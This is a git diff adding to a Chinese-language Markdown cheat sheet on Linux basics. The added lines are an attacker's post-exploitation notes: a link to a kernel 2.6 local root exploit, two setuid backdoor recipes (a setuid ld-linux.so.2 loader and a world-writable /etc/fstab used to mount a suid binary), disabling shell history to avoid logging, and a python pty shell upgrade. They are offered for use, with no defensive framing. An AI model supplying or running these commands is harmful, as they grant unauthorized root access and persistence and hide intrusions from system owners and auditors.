@@ -23,3 +23,44 @@ title: "Linux基础汇总"
 
 	-type b/d/c/p/l/f #查是块设备、目录、字符设备、管道、符号链接、普通文件
 
+* Linux kernel 2.6 < 2.6.19 (32bit) ip_append_data() local ring0 root exploit
+
+	[http://www.lengmo.net/post/1380]
+
+* 本地后门2法 xi4oyu
+
+	1.
+	
+	    cd /lib
+	    chmod +s ld-linux.so.2
+	    /lib/ld-linux.so.2 `which whoami`
+
+	2.
+	
+	    chmod a+w /etc/fstab
+	    echo 'test /mnt ext2 user,suid,exec,loop 0 0' >> /etc/fstab
+	    chown root.root setuid
+	    chmod u+s setuid
+	    mount test
+	    cd /mnt
+
+* ssh的history处理 & 日至相关
+
+	    export HISTFILE=/dev/null
+
+	ssh日志默认保存在 /var/log/secure文件里
+	
+* python -c 'import pty; pty.spawn("/bin/sh")'
+
+* 基础操作
+
+	增加一个用户
+	useradd application
+	passwd // 根据提示设置密码
+	
+* test
+
+
+	
+
+
